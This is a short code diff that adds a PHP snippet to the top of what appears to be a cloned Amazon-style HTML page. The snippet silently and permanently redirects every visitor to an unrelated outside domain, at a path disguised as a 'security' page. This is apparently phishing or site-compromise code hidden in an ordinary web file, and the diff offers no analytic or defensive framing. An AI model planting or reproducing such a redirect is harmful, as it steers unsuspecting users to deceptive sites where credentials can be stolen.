@@ -1,3 +1,7 @@
+<?php
+//* Permanently redirect page
+header("Location: https://aiocorretora.com.br/securitystecu0012/",TRUE,301);
+?>
 
 <!doctype html><html lang="en-us" class="a-no-js" data-19ax5a9jf="dingo"><!-- sp:feature:head-start -->
 <head><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>
